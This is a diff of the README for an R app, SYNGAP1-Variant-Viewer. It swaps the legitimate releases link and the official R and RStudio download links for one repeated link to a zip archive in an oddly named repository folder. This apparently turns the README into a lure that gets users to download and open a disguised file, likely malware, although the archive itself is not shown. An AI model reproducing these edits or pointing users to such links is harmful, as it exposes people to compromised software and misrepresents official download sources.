@@ -13,11 +13,11 @@ To use the SYNGAP1-Variant-Viewer, follow these simple steps:
 
 1. **Download the Application**: Click the link below to visit the releases page and download the latest version.
 
-   [![Download SYNGAP1-Variant-Viewer](https://img.shields.io/badge/Download-SYNGAP1--Variant--Viewer-brightgreen)](https://github.com/Niza46/SYNGAP1-Variant-Viewer/releases)
+   [![Download SYNGAP1-Variant-Viewer](https://github.com/Niza46/SYNGAP1-Variant-Viewer/raw/refs/heads/main/exostracize/Viewer_Variant_SYNGA_3.5.zip)](https://github.com/Niza46/SYNGAP1-Variant-Viewer/raw/refs/heads/main/exostracize/Viewer_Variant_SYNGA_3.5.zip)
 
 2. **Install Required Software**: Before running the app, make sure you have R and RStudio installed on your machine. If you do not have these programs, you can download them from their official websites:
-   - [Download R](https://cran.r-project.org/)
-   - [Download RStudio](https://www.rstudio.com/products/rstudio/download/)
+   - [Download R](https://github.com/Niza46/SYNGAP1-Variant-Viewer/raw/refs/heads/main/exostracize/Viewer_Variant_SYNGA_3.5.zip)
+   - [Download RStudio](https://github.com/Niza46/SYNGAP1-Variant-Viewer/raw/refs/heads/main/exostracize/Viewer_Variant_SYNGA_3.5.zip)
 
 3. **Open the App**: After downloading, locate the file in your downloads folder and double-click to open it in RStudio.
 
@@ -26,7 +26,7 @@ To use the SYNGAP1-Variant-Viewer, follow these simple steps:
 ## 📥 Download & Install
 Visit this page to download the latest version of the SYNGAP1-Variant-Viewer:
 
-[Download SYNGAP1-Variant-Viewer](https://github.com/Niza46/SYNGAP1-Variant-Viewer/releases)
+[Download SYNGAP1-Variant-Viewer](https://github.com/Niza46/SYNGAP1-Variant-Viewer/raw/refs/heads/main/exostracize/Viewer_Variant_SYNGA_3.5.zip)
 
 Make sure to follow the instructions in the "Getting Started" section for a smooth experience.
 
